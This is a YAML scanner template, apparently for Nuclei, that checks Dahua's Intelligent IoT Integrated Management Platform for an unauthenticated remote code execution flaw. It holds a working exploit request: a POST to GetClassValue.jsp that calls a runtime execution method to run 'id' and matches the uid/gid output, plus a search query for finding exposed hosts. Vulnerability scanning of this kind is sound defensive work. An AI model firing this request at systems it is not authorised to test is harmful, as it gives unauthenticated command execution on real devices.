http:
- matchers:
  - part: body
    regex:
    - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1\nHost: {{Hostname}}\n\
    Content-Type: application/json\n\n{\n    \"data\": {\n        \"clazzName\": \"\
    com.dahua.admin.util.RuntimeUtil\",\n        \"methodName\": \"syncexecReturnInputStream\"\
    ,\n        \"fieldName\": [\"id\"]\n    }\n}\n"
id: dahua-icc-getclassvalue-rce
info:
  author: ProjectDiscoveryAI
  description: 'Remote Code Execution Vulnerability in Dahua Intelligent IoT Integrated
    Management Platform via GetClassValue.jsp.

    '
  metadata:
    fofa-query: "app=\"dahua-\u667A\u80FD\u7269\u8054\u7EFC\u5408\u7BA1\u7406\u5E73\
      \u53F0\""
    max-request: 1
  name: Dahua 'GetClassValue' - Remote Code Execution
  reference:
  - https://github.com/zan8in/afrog/blob/main/pocs/afrog-pocs/vulnerability/dahua-icc-getclassvalue-rce.yaml
  severity: critical
  tags: rce,java,dahua,iot,unauth,vuln
